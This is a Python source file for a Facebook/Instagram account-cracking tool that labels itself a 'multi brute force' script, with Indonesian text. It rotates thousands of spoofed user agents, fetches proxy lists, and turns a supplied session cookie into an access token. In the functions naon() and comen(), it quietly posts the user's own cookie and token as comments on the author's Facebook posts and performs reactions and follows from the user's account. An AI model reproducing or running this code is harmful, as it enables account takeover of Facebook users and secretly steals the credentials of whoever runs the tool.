import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.tree import Tree
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich import print as vprint
from random import randint
from time import sleep as turu
ses=requests.Session()
FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD,akun=[],0,[],[],[],0,0,[],[],[],[],0,[]
pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
ubahP = []
pwbaru = []
data = {}
data2 = {}


for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 4.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='GT-N8000'
	e=random.randrange(100, 9999)
	f='Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Iron Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ua_crack.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Nexus 6P Build/MMB29P)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_crack.append(uaku2)

for xyzx in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in ua_crack:pass
	else:ua_crack.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in ua_crack:pass
	else:ua_crack.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in ua_crack:pass
	else:ua_crack.append(ugent3)
	
for xnxx in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ua_crack.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_crack.append(uaku2)

for yzirx in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]

url = "https://mbasic.facebook.com"
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
host = "https://mbasic.facebook.com"
#ua_crack = open("useragent_hikmat.txt","r").read().splitlines()

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

def proxp():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('proxy_mat.txt','w').write(proxf)
	except Exception as e:
		print('Failed')
	proxf = open('proxy_mat.txt','r').read().splitlines()


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
garis = f" {P}[{warna_warni_biasa}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

expired_script = ['01', '11', '2022']

def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		cek_cookie()

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

########## LICENSE ############

def banner():
	os.system("clear")
	cetak(nel(f"""
[blue]	______________  ___      ___  _______    _______
        \_"         "/ |"  \    /"  ||   _  "\  /"     "|
          \  •______/ • \   \  //   |(. |_)  :)(: ______)
          /.   .\ •  •  /\   \/.    ||:     \/  \/    |
          \_____/•  •  |: \.        |(|  _   \  // ___)
           /•  \  •  • |.  \    /:  ||: |_)  :)(:  (
           \___/•  •  •|___|\__/|___|(_______/  \__/
[white]                hikmat X flame multi brute force version 2.0
"""))

def cek_expired_script():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		pass

def comen(kook,token):
	cookie = kook
	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={cookie}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={toket}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":cookie});menu()

def cek_cookie():
	#cek_expired_script()
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			ua = random.choice(ua_crack)
			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cukuf = input(f" {P}[{warna_warni_biasa}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	#testi_ua()
	x = f"\t\t{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			naon(cookie)
			#menu()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError):
			x=f"{P2}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login() 
			
	
def naon(cookie):
	kuki = cookie
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf","Hikmat Gans Selalu Coeg><","semoga @[100000871607227:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100000871607227?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	coki = {'cookie':open('cookie.txt','r').read()}
	response3 = requests.Session().get(f"https://m.facebook.com/me/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
	try:
		tahunx = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahunx += nenen+", "
	except:pass
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = "-"
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = "-"
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = "-"
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = "-"
	print("")
	x=f" {P2}{nibba}\t\t   {H2}{nama}\t\t{K2}  {tumbal_id}\n {J2}{IP}\t    {B2}{pko}\t\t{A2}  {sekarang}"
	vprint(panel(x,title=f" [red]• [green]{hhl} [red]•[white] "))
	print("")
	x=f"{P2}[{H2}01{P2}] double crack {P2}    [{H2}02{P2}] instagram cracker {P2}    [{H2}03{P2}] one-tap sesi\n[{H2}04{P2}] file crack & id  [{H2}05{P2}] crack domain          [{H2}06{P2}] crack file\n[{H2}07{P2}] result ok & cp   [{H2}08{P2}] fitur lainnya         [{H2}09{P2}] donasi kouta\n[{M2}warning{P2}] Pembersih Sampah"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	flameXD = input(f"{garis} pilih : {H}")
	if flameXD in ["1","01"]:
		cracked_publickey()
	elif flameXD in ["2","02"]:
		login_kamu()
	elif flameXD in ["3","03"]:
		check_opsi_sesudah_crack()
	elif flameXD in ["4","04"]:
		create()
	elif flameXD in ["5","05"]:
		cracked_email()
	elif flameXD in ["6","06"]:
		crack_file()
	elif flameXD in ["7","07"]:
		hasil_crack()
	elif flameXD in ["08","8"]:
		cloning_xd()
	elif flameXD in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()

def hasil_crack():
	print("")
	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"\t\t{P2} hasil ok"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:flame = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(flame))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(flame))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun ok kamu\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" list akun ok kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"\t\t{P2} hasil cp"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:flame = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(flame))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(flame))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun cp kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list akun cp kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"{garis} isi yang benar ")
		hasil_crack()

def crack_file():
        try:
                konx = input(f'{garis} masukan file dump : ')
                id= open(konx).read().splitlines()
                print(f"\r{garis} total id : {H}{len(id)}")
                settingers()
        except FileNotFoundError:
                print("")
                x=f"{P2}file dump tidak ada... silahkan pilih nomor 2 untuk ngedump id dulu!! "
                vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
                input(f"\n{garis} kembali ")
                menu()

def create():
	x=f"[{H2}01{P2}] create file crack   [{H2}02{P2}] find random id publik   [{H2}03{P2}] cek info target"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	flameXD = input(f"{garis} pilih : {H}")
	if flameXD in ["01","1"]:
		dump_public()
	if flameXD in ["02","2"]:
		dump_publicv2()
	if flameXD in ["03","3"]:
		check_ingfo_akun()
	else:
		jalan(f"{garis} isi yang benar anak anjing ^_^")
		turu(5)
		create()

def cloning_xd():
	print("")
	x=f"{P2}[01] cloning with 2009-2010\n{P2}[02] cloning with 2011-2014\n{P2}[03] check hasil cloning\n{P2}[{M2}00{P2}] exit"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXD = input(f"{garis} pilih : {H}")
	if HikmatXD in ["1","01"]:
		cloning_2009_2010()
